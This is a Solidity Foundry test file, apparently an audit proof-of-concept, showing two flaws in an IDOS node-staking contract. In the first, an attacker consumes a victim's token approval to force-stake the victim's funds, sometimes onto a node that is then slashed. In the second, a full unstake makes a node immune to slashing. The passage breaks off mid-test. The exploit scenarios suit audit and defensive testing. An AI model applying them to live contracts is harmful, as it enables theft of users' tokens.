// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {IDOSToken} from "../src/IDOSToken.sol";
import {IDOSNodeStaking} from "../src/IDOSNodeStaking.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AuditPoC_Wave3
 * @notice Deepened analysis of F1 (Force-Staking) and F2 (Slash-Bypass) findings.
 *
 * Phase 2: F1 -- Force-Staking Attack (12 scenarios)
 * Phase 3: F2 -- Slash-Bypass via Full Unstake (12 sequences)
 *
 * Every test uses external balanceOf and allowance calls to prove token movements.
 */
contract AuditPoC_Wave3 is Test {
    IDOSToken idosToken;
    IDOSNodeStaking idosStaking;

    address owner;
    address victim;
    address attacker;
    address attacker2;
    address nodeA;
    address nodeB;
    address nodeC;

    uint256 constant START_TIME = 365 days;
    uint256 constant EPOCH_REWARD = 100;
    uint256 constant VICTIM_INITIAL = 1_000;
    uint256 constant STAKING_INITIAL = 10_000;

    function setUp() public {
        owner = makeAddr("owner");
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
        attacker2 = makeAddr("attacker2");
        nodeA = makeAddr("nodeA");
        nodeB = makeAddr("nodeB");
        nodeC = makeAddr("nodeC");

        vm.prank(owner);
        idosToken = new IDOSToken(owner);

        idosStaking = new IDOSNodeStaking(
            address(idosToken),
            owner,
            uint48(START_TIME),
            EPOCH_REWARD
        );

        // Fund staking contract with 10_000 tokens
        vm.prank(owner);
        require(idosToken.transfer(address(idosStaking), STAKING_INITIAL));

        // Fund victim with 1_000 tokens
        vm.prank(owner);
        require(idosToken.transfer(victim, VICTIM_INITIAL));

        // Fund attacker with 1_000 tokens
        vm.prank(owner);
        require(idosToken.transfer(attacker, 1_000));

        // Fund attacker2 with 1_000 tokens
        vm.prank(owner);
        require(idosToken.transfer(attacker2, 1_000));

        // Allowlist nodes
        vm.prank(owner);
        idosStaking.allowNode(nodeA);
        vm.prank(owner);
        idosStaking.allowNode(nodeB);
        vm.prank(owner);
        idosStaking.allowNode(nodeC);

        vm.warp(START_TIME);
    }

    // =============================================================
    // PHASE 2: F1 -- Force-Staking Analysis (12 Scenarios)
    // =============================================================

    // ---------------------------------------------------------------
    // Scenario 1: Victim gives approval for legitimate stake,
    //             attacker consumes it first
    // ---------------------------------------------------------------
    function test_F1_Scenario1_AttackerConsumesApprovalFirst() public {
        uint256 stakeAmount = 500;

        uint256 victimBefore = idosToken.balanceOf(victim);
        uint256 contractBefore = idosToken.balanceOf(address(idosStaking));
        uint256 allowanceBefore = idosToken.allowance(victim, address(idosStaking));

        console.log("=== F1 Scenario 1 ===");
        console.log("Victim balance before: %d", victimBefore);
        console.log("Contract balance before: %d", contractBefore);
        console.log("Allowance before: %d", allowanceBefore);

        // Victim approves staking contract
        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        uint256 allowanceAfterApprove = idosToken.allowance(victim, address(idosStaking));
        assertEq(allowanceAfterApprove, stakeAmount, "allowance set to 500");
        console.log("Allowance after approve: %d", allowanceAfterApprove);

        // Attacker force-stakes victim's tokens before victim can stake
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, stakeAmount);

        uint256 victimAfter = idosToken.balanceOf(victim);
        uint256 contractAfter = idosToken.balanceOf(address(idosStaking));
        uint256 allowanceAfter = idosToken.allowance(victim, address(idosStaking));

        console.log("Victim balance after: %d", victimAfter);
        console.log("Contract balance after: %d", contractAfter);
        console.log("Allowance after: %d", allowanceAfter);

        // PROVE: victim lost tokens, contract received them
        assertEq(victimAfter, victimBefore - stakeAmount, "victim tokens deducted");
        assertEq(contractAfter, contractBefore + stakeAmount, "contract received tokens");
        assertEq(allowanceAfter, allowanceBefore, "allowance consumed");

        // PROVE: stake recorded under attacker's node
        assertEq(
            idosStaking.stakeByNodeByUser(victim, nodeA),
            stakeAmount,
            "victim stake under nodeA"
        );
    }

    // ---------------------------------------------------------------
    // Scenario 2: Victim approves before attacker-selected node
    //             is allowlisted
    // ---------------------------------------------------------------
    function test_F1_Scenario2_ApprovalBeforeNodeAllowlisted() public {
        address nodeNotYetAllowed = makeAddr("nodeNotYetAllowed");
        uint256 stakeAmount = 500;

        // Victim approves staking contract
        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        // Node is NOT yet allowlisted, attacker tries to force-stake -> should revert
        vm.prank(attacker);
        vm.expectRevert(
            abi.encodeWithSignature("NodeIsNotAllowed(address)", nodeNotYetAllowed)
        );
        idosStaking.stake(victim, nodeNotYetAllowed, stakeAmount);

        // Verify: victim balance unchanged
        assertEq(idosToken.balanceOf(victim), VICTIM_INITIAL, "victim balance unchanged");
        assertEq(
            idosToken.allowance(victim, address(idosStaking)),
            stakeAmount,
            "allowance intact"
        );

        // Owner allowlists node
        vm.prank(owner);
        idosStaking.allowNode(nodeNotYetAllowed);

        // Now attacker force-stakes -> should succeed
        uint256 victimBefore = idosToken.balanceOf(victim);
        uint256 contractBefore = idosToken.balanceOf(address(idosStaking));

        vm.prank(attacker);
        idosStaking.stake(victim, nodeNotYetAllowed, stakeAmount);

        assertEq(
            idosToken.balanceOf(victim),
            victimBefore - stakeAmount,
            "victim tokens deducted after allowlist"
        );
        assertEq(
            idosToken.balanceOf(address(idosStaking)),
            contractBefore + stakeAmount,
            "contract received tokens after allowlist"
        );
    }

    // ---------------------------------------------------------------
    // Scenario 3: Attacker force-stakes only part of the allowance
    // ---------------------------------------------------------------
    function test_F1_Scenario3_PartialForceStake() public {
        uint256 approveAmount = 1000;
        uint256 forceStakeAmount = 300;

        // Victim approves 1000 tokens
        vm.prank(victim);
        idosToken.approve(address(idosStaking), approveAmount);

        assertEq(
            idosToken.allowance(victim, address(idosStaking)),
            approveAmount,
            "allowance is 1000"
        );

        uint256 victimBefore = idosToken.balanceOf(victim);
        uint256 contractBefore = idosToken.balanceOf(address(idosStaking));

        // Attacker force-stakes 300 (partial)
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, forceStakeAmount);

        // Verify: 300 moved, 700 allowance remains
        assertEq(
            idosToken.balanceOf(victim),
            victimBefore - forceStakeAmount,
            "victim lost 300"
        );
        assertEq(
            idosToken.balanceOf(address(idosStaking)),
            contractBefore + forceStakeAmount,
            "contract gained 300"
        );
        assertEq(
            idosToken.allowance(victim, address(idosStaking)),
            approveAmount - forceStakeAmount,
            "remaining allowance 700"
        );
        assertEq(
            idosStaking.stakeByNodeByUser(victim, nodeA),
            forceStakeAmount,
            "victim stake = 300"
        );
    }

    // ---------------------------------------------------------------
    // Scenario 4: Attacker force-stakes repeatedly until allowance
    //             or balance exhausted
    // ---------------------------------------------------------------
    function test_F1_Scenario4_RepeatedForceStakeUntilExhausted() public {
        uint256 approveAmount = 1000;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), approveAmount);

        assertEq(idosToken.balanceOf(victim), VICTIM_INITIAL, "victim has 1000");

        uint256 increment = 200;
        uint256 totalForceStaked = 0;

        for (uint256 i = 0; i < 5; i++) {
            uint256 victimBeforeStep = idosToken.balanceOf(victim);
            uint256 contractBeforeStep = idosToken.balanceOf(address(idosStaking));

            uint256 toStake = increment;
            if (victimBeforeStep < increment) {
                toStake = victimBeforeStep;
            }

            if (toStake == 0) break;

            vm.prank(attacker);
            idosStaking.stake(victim, nodeA, toStake);

            totalForceStaked += toStake;

            assertEq(
                idosToken.balanceOf(victim),
                victimBeforeStep - toStake,
                "victim balance decreased"
            );
            assertEq(
                idosToken.balanceOf(address(idosStaking)),
                contractBeforeStep + toStake,
                "contract balance increased"
            );

            console.log("Step:", i);
            console.log("  staked:", toStake);
            console.log("  remaining:", idosToken.balanceOf(victim));
            console.log("  total staked:", totalForceStaked);
        }

        assertEq(totalForceStaked, 1000, "all 1000 tokens force-staked");
        assertEq(idosToken.balanceOf(victim), 0, "victim balance exhausted");
        assertEq(
            idosStaking.stakeByNodeByUser(victim, nodeA),
            1000,
            "victim has 1000 stake on nodeA"
        );
    }

    // ---------------------------------------------------------------
    // Scenario 5: Victim later receives more tokens while unlimited
    //             approval remains
    // ---------------------------------------------------------------
    function test_F1_Scenario5_UnlimitedApprovalDrainsNewTokens() public {
        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        assertEq(
            idosToken.allowance(victim, address(idosStaking)),
            type(uint256).max,
            "unlimited approval"
        );

        // Attacker force-stakes 500
        uint256 victimBefore = idosToken.balanceOf(victim);
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, 500);

        assertEq(idosToken.balanceOf(victim), victimBefore - 500, "victim lost 500");
        assertEq(idosStaking.stakeByNodeByUser(victim, nodeA), 500, "500 staked to nodeA");

        // Victim receives 500 more tokens
        vm.prank(owner);
        require(idosToken.transfer(victim, 500));

        uint256 victimAfterTransfer = idosToken.balanceOf(victim);
        console.log("Victim balance after receiving 500 more: %d", victimAfterTransfer);
        assertEq(victimAfterTransfer, VICTIM_INITIAL - 500 + 500, "victim has 1000 again");

        // Attacker force-stakes another 500
        uint256 contractBefore = idosToken.balanceOf(address(idosStaking));
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, 500);

        // PROVE: new tokens were drained (victim had 1000 after transfer, lost 500 -> 500)
        assertEq(idosToken.balanceOf(victim), VICTIM_INITIAL - 500, "victim drained to 500");
        assertEq(
            idosToken.balanceOf(address(idosStaking)),
            contractBefore + 500,
            "contract received new tokens"
        );
        assertEq(
            idosStaking.stakeByNodeByUser(victim, nodeA),
            1000,
            "total 1000 staked to nodeA"
        );

        console.log("F1 Scenario 5: Unlimited approval allows draining new tokens sent to victim");
    }

    // ---------------------------------------------------------------
    // Scenario 6: Attacker distributes victim's balance across
    //             multiple nodes
    // ---------------------------------------------------------------
    function test_F1_Scenario6_DistributeAcrossMultipleNodes() public {
        uint256 approveAmount = 999;
        uint256 perNodeAmount = 333;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), approveAmount);

        uint256 victimBefore = idosToken.balanceOf(victim);
        uint256 contractBefore = idosToken.balanceOf(address(idosStaking));

        // Attacker distributes: 1/3 to nodeA, 1/3 to nodeB, 1/3 to nodeC
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, perNodeAmount);
        vm.prank(attacker);
        idosStaking.stake(victim, nodeB, perNodeAmount);
        vm.prank(attacker);
        idosStaking.stake(victim, nodeC, perNodeAmount);

        uint256 totalForceStaked = perNodeAmount * 3;

        // Verify distribution
        assertEq(idosStaking.stakeByNodeByUser(victim, nodeA), perNodeAmount, "stake on nodeA");
        assertEq(idosStaking.stakeByNodeByUser(victim, nodeB), perNodeAmount, "stake on nodeB");
        assertEq(idosStaking.stakeByNodeByUser(victim, nodeC), perNodeAmount, "stake on nodeC");

        // Verify global accounting
        assertEq(idosToken.balanceOf(victim), victimBefore - totalForceStaked, "victim reduced");
        assertEq(idosToken.balanceOf(address(idosStaking)), contractBefore + totalForceStaked, "contract increased");

        // Verify node stakes
        assertEq(idosStaking.getNodeStake(nodeA), perNodeAmount, "nodeA stake");
        assertEq(idosStaking.getNodeStake(nodeB), perNodeAmount, "nodeB stake");
        assertEq(idosStaking.getNodeStake(nodeC), perNodeAmount, "nodeC stake");

        (uint256 active, uint256 slashed) = idosStaking.getUserStake(victim);
        assertEq(active, totalForceStaked, "victim total active stake");
        assertEq(slashed, 0, "victim no slashed stake");

        console.log("F1 Scenario 6: Attacker distributed victim's %d tokens across 3 nodes", totalForceStaked);
    }

    // ---------------------------------------------------------------
    // Scenario 7: Attacker force-stakes immediately before a node
    //             is slashed -> permanent loss
    // ---------------------------------------------------------------
    function test_F1_Scenario7_ForceStakeThenSlash_PermanentLoss() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        uint256 victimBefore = idosToken.balanceOf(victim);
        uint256 contractBefore = idosToken.balanceOf(address(idosStaking));

        // Attacker force-stakes victim's tokens to nodeA
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, stakeAmount);

        assertEq(idosToken.balanceOf(victim), victimBefore - stakeAmount, "victim lost tokens");
        assertEq(idosToken.balanceOf(address(idosStaking)), contractBefore + stakeAmount, "contract received");

        // Owner slashes nodeA
        vm.prank(owner);
        idosStaking.slash(nodeA);

        // Owner withdraws slashed stakes (includes victim's tokens)
        uint256 ownerBefore = idosToken.balanceOf(owner);
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();
        uint256 ownerAfter = idosToken.balanceOf(owner);

        // Owner seized the tokens
        assertEq(ownerAfter - ownerBefore, stakeAmount, "owner withdrew slashed stake");

        // Prove: victim's tokens are permanently lost
        vm.expectRevert(abi.encodeWithSignature("NodeIsSlashed(address)", nodeA));
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        (uint256 active, uint256 slashed) = idosStaking.getUserStake(victim);
        assertEq(active, 0, "no active stake");
        assertEq(slashed, stakeAmount, "stake permanently slashed");
        assertEq(idosToken.balanceOf(victim), VICTIM_INITIAL - stakeAmount, "victim cannot recover");

        console.log("F1 Scenario 7: Victim permanently lost %d tokens via force-stake slash", stakeAmount);
    }

    // ---------------------------------------------------------------
    // Scenario 8: Victim attempts to unstake or redirect the forced
    //             position
    // ---------------------------------------------------------------
    function test_F1_Scenario8_VictimCanUnstakeButMustWait14Days() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        // Attacker force-stakes
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, stakeAmount);

        // Victim tries to unstake (unstake has no access control)
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        // Verify: unstake recorded, stake cleared
        assertEq(idosStaking.stakeByNodeByUser(victim, nodeA), 0, "stake cleared");

        // Victim cannot withdraw immediately (14-day delay)
        vm.expectRevert(abi.encodeWithSignature("NoWithdrawableStake()"));
        vm.prank(victim);
        idosStaking.withdrawUnstaked();

        // After 14 days + 1 second
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 beforeWithdraw = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        uint256 afterWithdraw = idosToken.balanceOf(victim);

        assertEq(afterWithdraw - beforeWithdraw, stakeAmount, "victim recovers after delay");

        console.log("F1 Scenario 8: Victim can unstake but must wait %d days",
            idosStaking.UNSTAKE_DELAY() / 1 days);
    }

    // ---------------------------------------------------------------
    // Scenario 9: Victim revokes approval after the forced stake
    // ---------------------------------------------------------------
    function test_F1_Scenario9_VictimRevokesApproval() public {
        uint256 approveAmount = 1000;
        uint256 forceStakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), approveAmount);

        // Attacker force-stakes 500
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, forceStakeAmount);

        assertEq(idosStaking.stakeByNodeByUser(victim, nodeA), forceStakeAmount, "500 staked");

        // Victim revokes approval
        vm.prank(victim);
        idosToken.approve(address(idosStaking), 0);

        assertEq(idosToken.allowance(victim, address(idosStaking)), 0, "allowance revoked");

        // Attacker tries to force-stake again -> should revert (allowance 0)
        vm.prank(attacker);
        vm.expectRevert();
        idosStaking.stake(victim, nodeA, 100);

        // Verify: victim's remaining balance intact
        assertEq(idosToken.balanceOf(victim), VICTIM_INITIAL - forceStakeAmount, "remaining safe");

        console.log("F1 Scenario 9: Revoking approval stops further force-staking");
    }

    // ---------------------------------------------------------------
    // Scenario 10: Node is disallowed after the forced stake
    // ---------------------------------------------------------------
    function test_F1_Scenario10_NodeDisallowedAfterForceStake() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        // Attacker force-stakes to nodeA
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, stakeAmount);

        // Owner disallows nodeA
        vm.prank(owner);
        idosStaking.disallowNode(nodeA);

        // Can victim still unstake? -> YES, unstake doesn't check allowlist
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        assertEq(idosStaking.stakeByNodeByUser(victim, nodeA), 0, "stake cleared");

        // Withdraw after delay
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 beforeWithdraw = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        uint256 afterWithdraw = idosToken.balanceOf(victim);

        assertEq(afterWithdraw - beforeWithdraw, stakeAmount, "victim recovers despite disallow");

        console.log("F1 Scenario 10: Disallowing node doesn't prevent unstaking existing stake");
    }

    // ---------------------------------------------------------------
    // Scenario 11: Node is slashed after being disallowed
    // ---------------------------------------------------------------
    function test_F1_Scenario11_NodeSlashedAfterDisallowed() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        // Attacker force-stakes to nodeA
        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, stakeAmount);

        assertEq(idosStaking.getNodeStake(nodeA), stakeAmount, "nodeA has stake");

        // Owner disallows nodeA
        vm.prank(owner);
        idosStaking.disallowNode(nodeA);

        // Owner tries to slash nodeA -> stakeByNode still contains nodeA
        vm.prank(owner);
        idosStaking.slash(nodeA);

        // Verify node is now slashed (check via getSlashedNodeStakes)
        IDOSNodeStaking.NodeStake[] memory slashedNodes_ = idosStaking.getSlashedNodeStakes();
        bool found;
        for (uint256 i = 0; i < slashedNodes_.length; i++) {
            if (slashedNodes_[i].node == nodeA) found = true;
        }
        assertTrue(found, "nodeA is slashed");

        // Owner can withdraw the slashed stake
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();

        // Victim's tokens are lost
        (uint256 active, uint256 slashed) = idosStaking.getUserStake(victim);
        assertEq(active, 0, "no active stake");
        assertEq(slashed, stakeAmount, "stake slashed even though node was disallowed first");

        console.log("F1 Scenario 11: Disallow doesn't protect from slash (stakeByNode still exists)");
    }

    // ---------------------------------------------------------------
    // Scenario 12: Multiple attackers race to consume the same victim
    //             allowance
    // ---------------------------------------------------------------
    function test_F1_Scenario12_MultipleAttackersRace() public {
        uint256 stakeAmount = 1000;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        uint256 victimBefore = idosToken.balanceOf(victim);
        uint256 contractBefore = idosToken.balanceOf(address(idosStaking));

        // Two attackers both force-stake, splitting the allowance
        uint256 attacker1Stake = 400;
        uint256 attacker2Stake = 600;

        vm.prank(attacker);
        idosStaking.stake(victim, nodeA, attacker1Stake);

        vm.prank(attacker2);
        idosStaking.stake(victim, nodeB, attacker2Stake);

        uint256 totalForceStaked = attacker1Stake + attacker2Stake;

        assertEq(idosStaking.stakeByNodeByUser(victim, nodeA), attacker1Stake, "attacker1 to nodeA");
        assertEq(idosStaking.stakeByNodeByUser(victim, nodeB), attacker2Stake, "attacker2 to nodeB");
        assertEq(idosToken.balanceOf(victim), victimBefore - totalForceStaked, "victim lost all");
        assertEq(idosToken.balanceOf(address(idosStaking)), contractBefore + totalForceStaked, "contract got all");

        console.log("F1 Scenario 12: Two attackers split victim's allowance");
        console.log("  Attacker1 to nodeA:", attacker1Stake);
        console.log("  Attacker2 to nodeB:", attacker2Stake);
    }

    // =============================================================
    // PHASE 3: F2 -- Slash-Bypass Analysis (12 Sequences)
    // =============================================================

    // ---------------------------------------------------------------
    // Sequence 1: Full unstake -> owner tries to slash during delay
    //             -> user withdraws
    // ---------------------------------------------------------------
    function test_F2_Sequence1_FullUnstakeSlashDuringDelayUserWithdraws() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        uint256 contractBalanceBeforeUnstake = idosToken.balanceOf(address(idosStaking));

        // Full unstake
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        // Prove: node removed from active stake mapping
        assertEq(idosStaking.getNodeStake(nodeA), 0, "node removed from stakeByNode");
        assertEq(idosToken.balanceOf(address(idosStaking)), contractBalanceBeforeUnstake, "pending unstake held");

        // Owner tries to slash during delay -> reverts (NodeIsUnknown)
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeA));
        idosStaking.slash(nodeA);

        // Warp past delay
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 beforeWithdraw = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        uint256 afterWithdraw = idosToken.balanceOf(victim);

        // Prove: node immune, user recovers funds
        assertEq(afterWithdraw - beforeWithdraw, stakeAmount, "user fully recovered");

        console.log("F2 Sequence 1: Full unstake makes node immune during delay, user recovers");
    }

    // ---------------------------------------------------------------
    // Sequence 2: Partial unstake -> owner slashes remaining active
    //             stake
    // ---------------------------------------------------------------
    function test_F2_Sequence2_PartialUnstakeThenSlashRemainder() public {
        uint256 totalStake = 1000;
        uint256 unstakeAmount = 400;
        uint256 remainingStake = 600;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), totalStake);

        // Victim stakes 1000
        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, totalStake);

        // Victim unstakes 400 (partial)
        vm.prank(victim);
        idosStaking.unstake(nodeA, unstakeAmount);

        // Node still in stakeByNode with 600
        assertEq(idosStaking.getNodeStake(nodeA), remainingStake, "node has 600 remaining");

        // Owner slashes -> succeeds on the 600 remainder
        vm.prank(owner);
        idosStaking.slash(nodeA);

        IDOSNodeStaking.NodeStake[] memory slashedNodes_ = idosStaking.getSlashedNodeStakes();
        bool found;
        for (uint256 i = 0; i < slashedNodes_.length; i++) {
            if (slashedNodes_[i].node == nodeA) found = true;
        }
        assertTrue(found, "node is slashed");

        // Owner withdraws slashed stake
        uint256 ownerBefore = idosToken.balanceOf(owner);
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();
        uint256 ownerAfter = idosToken.balanceOf(owner);

        assertEq(ownerAfter - ownerBefore, remainingStake, "owner seized 600");

        (uint256 active, uint256 slashed) = idosStaking.getUserStake(victim);
        assertEq(active, 0, "no active stake");
        assertEq(slashed, remainingStake, "600 slashed");

        // Victim recovers the unstaked 400 after delay
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 beforeWithdraw = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        uint256 afterWithdraw = idosToken.balanceOf(victim);

        assertEq(afterWithdraw - beforeWithdraw, unstakeAmount, "victim recovered unstaked 400");

        console.log("F2 Sequence 2: Partial unstake leaves remainder slashable");
        console.log("  Unstaked 400 recovered by victim, remaining 600 slashed");
    }

    // ---------------------------------------------------------------
    // Sequence 3: Multiple users stake to one node -> coordinate
    //             full unstake
    // ---------------------------------------------------------------
    function test_F2_Sequence3_MultipleUsersFullUnstake() public {
        uint256 userAStake = 500;
        uint256 userBStake = 500;

        // Fund userB (attacker)
        vm.prank(owner);
        require(idosToken.transfer(attacker, userBStake));

        vm.prank(victim);
        idosToken.approve(address(idosStaking), userAStake);
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), userBStake);

        // Both stake to nodeA
        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, userAStake);
        vm.prank(attacker);
        idosStaking.stake(address(0), nodeA, userBStake);

        assertEq(idosStaking.getNodeStake(nodeA), 1000, "node has 1000");

        // Both unstake fully
        vm.prank(victim);
        idosStaking.unstake(nodeA, userAStake);
        vm.prank(attacker);
        idosStaking.unstake(nodeA, userBStake);

        assertEq(idosStaking.getNodeStake(nodeA), 0, "node removed");

        // Slash reverts with NodeIsUnknown
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeA));
        idosStaking.slash(nodeA);

        // Both withdraw after delay
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 victimBefore = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(victim) - victimBefore, userAStake, "victim recovered");

        uint256 attackerBefore = idosToken.balanceOf(attacker);
        vm.prank(attacker);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(attacker) - attackerBefore, userBStake, "attacker recovered");

        console.log("F2 Sequence 3: Both users fully unstaked -> node immune from slash");
    }

    // ---------------------------------------------------------------
    // Sequence 4: One user remains with 1 wei while others unstake
    // ---------------------------------------------------------------
    function test_F2_Sequence4_OneWeiRemainingPreventsBypass() public {
        uint256 userAStake = 1000;
        uint256 userBStake = 1000;
        uint256 userCStake = 1000;

        address userB = attacker;
        address userC = attacker2;

        // Fund users B and C
        vm.prank(owner);
        require(idosToken.transfer(userB, userBStake));
        vm.prank(owner);
        require(idosToken.transfer(userC, userCStake));

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);
        vm.prank(userB);
        idosToken.approve(address(idosStaking), type(uint256).max);
        vm.prank(userC);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Three users stake to nodeA
        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, userAStake);
        vm.prank(userB);
        idosStaking.stake(address(0), nodeA, userBStake);
        vm.prank(userC);
        idosStaking.stake(address(0), nodeA, userCStake);

        assertEq(idosStaking.getNodeStake(nodeA), 3000, "node has 3000");

        // Two fully unstake
        vm.prank(victim);
        idosStaking.unstake(nodeA, userAStake);
        vm.prank(userB);
        idosStaking.unstake(nodeA, userBStake);

        // User C leaves 1 wei
        vm.prank(userC);
        idosStaking.unstake(nodeA, userCStake - 1);

        // Node still in stakeByNode with 1 wei
        assertEq(idosStaking.getNodeStake(nodeA), 1, "node has 1 wei");

        // Slash succeeds
        vm.prank(owner);
        idosStaking.slash(nodeA);

        IDOSNodeStaking.NodeStake[] memory slashedNodes_ = idosStaking.getSlashedNodeStakes();
        bool found;
        for (uint256 i = 0; i < slashedNodes_.length; i++) {
            if (slashedNodes_[i].node == nodeA) found = true;
        }
        assertTrue(found, "node slashed");

        // Owner withdraws slashed stake
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();

        // The 1 wei is slashed
        (uint256 active, uint256 slashed) = idosStaking.getUserStake(userC);
        assertEq(slashed, 1, "userC's 1 wei slashed");

        // The two pending unstakes withdraw safely
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);

        uint256 victimBefore = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(victim) - victimBefore, userAStake, "victim recovered");

        uint256 userBBefore = idosToken.balanceOf(userB);
        vm.prank(userB);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(userB) - userBBefore, userBStake, "userB recovered");

        console.log("F2 Sequence 4: 1 wei remaining keeps node slashable");
        console.log("  Two full unstakers escaped, third user's 1 wei slashed");
    }

    // ---------------------------------------------------------------
    // Sequence 5: Node is disallowed before full unstake
    // ---------------------------------------------------------------
    function test_F2_Sequence5_DisallowedBeforeFullUnstake() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        // Owner disallows nodeA
        vm.prank(owner);
        idosStaking.disallowNode(nodeA);

        // User unstakes fully
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        assertEq(idosStaking.getNodeStake(nodeA), 0, "node removed");

        // Slash reverts with NodeIsUnknown
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeA));
        idosStaking.slash(nodeA);

        console.log("F2 Sequence 5: Disallow + full unstake -> NodeIsUnknown on slash");
    }

    // ---------------------------------------------------------------
    // Sequence 6: Node is re-allowlisted after full unstake
    // ---------------------------------------------------------------
    function test_F2_Sequence6_ReAllowlistedAfterFullUnstake() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        // Full unstake -> node removed from stakeByNode
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        assertEq(idosStaking.getNodeStake(nodeA), 0, "node removed");

        // Re-allowlist (doesn't restore stakeByNode)
        vm.prank(owner);
        idosStaking.allowNode(nodeA);

        // Slash -> NodeIsUnknown (not in stakeByNode)
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeA));
        idosStaking.slash(nodeA);

        console.log("F2 Sequence 6: Re-allowlisting after full unstake doesn't restore stakeByNode");
        console.log("  Slash still reverts with NodeIsUnknown");
    }

    // ---------------------------------------------------------------
    // Sequence 7: New stake added after old pending unstake escaped
    //             slashing
    // ---------------------------------------------------------------
    function test_F2_Sequence7_NewStakeAfterOldUnstakeEscaped() public {
        uint256 userAStake = 500;
        uint256 userBStake = 300;

        vm.prank(owner);
        require(idosToken.transfer(attacker, userBStake));

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // UserA stakes
        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, userAStake);

        // Full unstake -> node removed
        vm.prank(victim);
        idosStaking.unstake(nodeA, userAStake);

        assertEq(idosStaking.getNodeStake(nodeA), 0, "node removed");

        // New user stakes
        vm.prank(attacker);
        idosStaking.stake(address(0), nodeA, userBStake);

        // Node back with new stake
        assertEq(idosStaking.getNodeStake(nodeA), userBStake, "node back with new stake");

        // Slash succeeds
        vm.prank(owner);
        idosStaking.slash(nodeA);

        IDOSNodeStaking.NodeStake[] memory slashedNodes_ = idosStaking.getSlashedNodeStakes();
        bool found;
        for (uint256 i = 0; i < slashedNodes_.length; i++) {
            if (slashedNodes_[i].node == nodeA) found = true;
        }
        assertTrue(found, "node slashed");

        // Owner withdraws - only the new stake
